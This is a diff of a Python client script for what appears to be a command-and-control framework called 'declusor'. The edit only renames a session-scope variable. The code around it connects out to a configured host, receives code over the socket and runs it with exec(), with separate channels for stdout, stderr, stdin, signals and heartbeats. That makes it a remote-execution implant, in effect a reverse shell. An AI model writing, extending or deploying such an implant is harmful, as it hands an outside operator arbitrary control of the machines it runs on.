@@ -22,9 +22,8 @@ CHANNEL_STDERR = int("$DECLUSOR_CH_STDERR")
 CHANNEL_STDIN = int("$DECLUSOR_CH_STDIN")
 CHANNEL_SIGNAL = int("$DECLUSOR_CH_SIGNAL")
 CHANNEL_HEARTBEAT = int("$DECLUSOR_CH_HEARTBEAT")
-SESSION_SCOPE = {"__name__": "__declusor__"}
 
-
+_SESSION_SCOPE = {"__name__": "__declusor__"}
 _CODE_TYPE = type((lambda: None).__code__)
 
 
@@ -80,7 +79,7 @@ def _execute(payload_bytes: bytes, sock: socket.socket) -> None:
             source = payload_bytes.decode(errors="replace")
             code = compile(source, "<remote>", "exec")
 
-        exec(code, SESSION_SCOPE)  # noqa: S102
+        exec(code, _SESSION_SCOPE)  # noqa: S102
     except (Exception, SystemExit) as exc:
         buf.write(f"[py_socket error] {type(exc).__name__}: {exc}\n")
     finally:
@@ -96,7 +95,7 @@ def _execute(payload_bytes: bytes, sock: socket.socket) -> None:
 
 def main() -> None:
     with socket.create_connection((HOST, PORT)) as sock:
-        SESSION_SCOPE["_send_frame"] = lambda ch, data: _send_frame(sock, ch, data)
+        _SESSION_SCOPE["_send_frame"] = lambda ch, data: _send_frame(sock, ch, data)
 
         magic_hex = importlib.util.MAGIC_NUMBER.hex()
         metadata = json.dumps(
@@ -126,7 +125,7 @@ def main() -> None:
                 if helpers_code is None:
                     helpers_code = compile(helpers_bytes.decode(errors="replace"), "<helpers>", "exec")
 
-                exec(helpers_code, SESSION_SCOPE)
+                exec(helpers_code, _SESSION_SCOPE)
             except (Exception, SystemExit):
                 pass
 
@@ -134,6 +133,7 @@ def main() -> None:
 
         while (frame := _read_frame(sock)) is not None:
             channel, payload_bytes = frame
+
             if channel == CHANNEL_HEARTBEAT:
                 _send_frame(sock, CHANNEL_HEARTBEAT, b"")
                 continue
